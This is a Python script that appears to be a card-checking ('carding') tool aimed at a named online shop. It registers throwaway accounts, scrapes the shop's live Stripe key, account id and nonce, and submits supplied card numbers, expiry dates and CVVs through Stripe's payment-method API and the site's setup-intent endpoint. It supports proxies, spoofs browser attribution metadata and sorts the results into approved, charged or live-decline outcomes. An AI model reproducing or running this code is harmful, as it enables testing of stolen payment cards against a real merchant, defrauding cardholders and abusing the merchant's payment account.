import httpx
import asyncio
import re
import random
import string
import time
import uuid

UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
    "transaction_not_allowed", "card_not_supported",
]

SITE_URL = "https://redbluechair.com"


def _rand_guid():
    return str(uuid.uuid4())


async def redblue_auth_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()
    em = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

    transport = None
    if proxy:
        transport = httpx.AsyncHTTPTransport(proxy=proxy)

    h = {"user-agent": UA, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}

    async with httpx.AsyncClient(
        timeout=20,
        transport=transport,
        follow_redirects=True,
        headers=h,
    ) as client:
        nc = None
        for _ in range(3):
            try:
                r1 = await client.get(f"{SITE_URL}/my-account/")
                m = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
                if m:
                    nc = m.group(1)
                    break
            except Exception:
                await asyncio.sleep(1)

        if not nc:
            elapsed = f"{time.time() - start:.1f}s"
            return f"Error - Nonce fetch failed [{elapsed}]"

        await client.post(
            f"{SITE_URL}/my-account/",
            data={
                "email": em,
                "password": "Pass123!",
                "woocommerce-register-nonce": nc,
                "register": "Register",
            },
        )

        r2 = await client.get(f"{SITE_URL}/my-account/add-payment-method/")

        sn = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', r2.text)
        pk = re.search(r'pk_live_[a-zA-Z0-9]+', r2.text)
        at = re.search(r'acct_[a-zA-Z0-9]+', r2.text)

        if not all([sn, pk, at]):
            elapsed = f"{time.time() - start:.1f}s"
            return f"Error - Stripe data fetch failed [{elapsed}]"

        h_s = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": UA,
        }

        pay = (
            f"billing_details[name]=+&"
            f"billing_details[email]={em.replace('@', '%40')}&"
            f"billing_details[address][country]=US&"
            f"billing_details[address][postal_code]=10080&"
            f"type=card&"
            f"card[number]={cc}&"
            f"card[cvc]={cvv}&"
            f"card[exp_year]={yy}&"
            f"card[exp_month]={mm}&"
            f"allow_redisplay=unspecified&"
            f"payment_user_agent=stripe.js%2F350609fece%3B+stripe-js-v3%2F350609fece%3B+payment-element%3B+deferred-intent&"
            f"referrer=https%3A%2F%2Fredbluechair.com&"
            f"time_on_page={random.randint(30000, 120000)}&"
            f"client_attribution_metadata[client_session_id]={_rand_guid()}&"
            f"client_attribution_metadata[merchant_integration_source]=elements&"
            f"client_attribution_metadata[merchant_integration_subtype]=payment-element&"
            f"client_attribution_metadata[merchant_integration_version]=2021&"
            f"client_attribution_metadata[payment_intent_creation_flow]=deferred&"
            f"client_attribution_metadata[payment_method_selection_flow]=merchant_specified&"
            f"client_attribution_metadata[elements_session_config_id]={_rand_guid()}&"
            f"client_attribution_metadata[merchant_integration_additional_elements][0]=payment&"
            f"guid={_rand_guid().replace('-', '')}0fbc51&"
            f"muid={_rand_guid().replace('-', '')}e4ab79&"
            f"sid={_rand_guid().replace('-', '')}898582&"
            f"key={pk.group(0)}&"
            f"_stripe_account={at.group(0)}"
        )

        r3 = await client.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=h_s,
            content=pay,
        )
        pm = r3.json()

        if "id" not in pm:
            err_msg = pm.get("error", {}).get("message", "PM creation failed")
            elapsed = f"{time.time() - start:.1f}s"
            return f"Declined - {err_msg} [{elapsed}]"

        pm_id = pm["id"]

        r4 = await client.post(
            f"{SITE_URL}/wp-admin/admin-ajax.php",
            files={
                "action": (None, "create_setup_intent"),
                "wcpay-payment-method": (None, pm_id),
                "_ajax_nonce": (None, sn.group(1)),
            },
        )

        elapsed = f"{time.time() - start:.1f}s"

        try:
            result = r4.json()
        except Exception:
            return f"Error - Invalid response [{elapsed}]"

        result_str = str(result).lower()

        if ("success" in result_str and "true" in result_str) or "succeeded" in result_str:
            if "requires_action" in result_str:
                return f"Approved - 3DS Required [{elapsed}]"
            return f"Charged - Setup Succeeded [{elapsed}]"

        if "error" in result_str or "declined" in result_str:
            err_data = result.get("data", {}) if isinstance(result, dict) else {}
            err_obj = err_data.get("error", {}) if isinstance(err_data, dict) else {}
            decline_code = err_obj.get("decline_code", "") if isinstance(err_obj, dict) else ""
            err_message = err_obj.get("message", "") if isinstance(err_obj, dict) else ""

            if decline_code in LIVE_DECLINE_CODES:
                return f"Declined - {decline_code} [{elapsed}]"

            return f"Declined - {decline_code or err_message or 'card_declined'} [{elapsed}]"

        return f"Error - Unexpected: {str(result)[:100]} [{elapsed}]"
